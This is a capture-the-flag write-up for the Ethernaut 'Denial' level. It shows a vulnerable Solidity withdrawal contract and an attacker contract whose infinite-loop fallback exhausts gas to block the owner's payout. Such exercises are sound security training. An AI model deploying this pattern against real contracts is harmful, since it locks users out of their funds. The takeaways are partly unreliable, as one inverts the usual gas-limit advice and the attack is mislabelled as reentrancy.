---
description: reentrancy and gas
---

# 20 - Denial

Ethernaut Levl20: [Denial](https://ethernaut.openzeppelin.com/level/0xD0a78dB26AA59694f5Cb536B50ef2fa00155C488)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

### Goal of this level

* deny the `owner` from withdrawing funds

### What you should know before

* reentrancy

```solidity
contract AttackDenial {
    Denial public denialContract;

    constructor(Denial _instance) public {
        denialContract = _instance;
        denialContract.setWithdrawPartner(address(this));
    }

    fallback() payable external {
        while(true) {

        }
    }
}
```

```solidity
// withdraw 1% to recipient and 1% to owner
function withdraw() public {
    uint amountToSend = address(this).balance / 100;
    // perform a call without checking return
    // The recipient can revert, the owner will still get their share
    partner.call{value:amountToSend}("");
    payable(owner).transfer(amountToSend);
    // keep track of last withdrawal time
    timeLastWithdrawn = block.timestamp;
    withdrawPartnerBalances[partner] +=  amountToSend;
}
```

Withdrawal from the `owner` will be reverted because of **infinite** `while` loop.

(If we merely reverted from our fallback function, the next line will still be executed because it's using low-level `call` )

## Key Takeaway

* external calls to unknown contracts can still create denial of service attack vectors
* makes sure a fixed amount of gas is not specified
* make sure you follow **checks-effects-interactions** pattern to prevent reentrancy attack
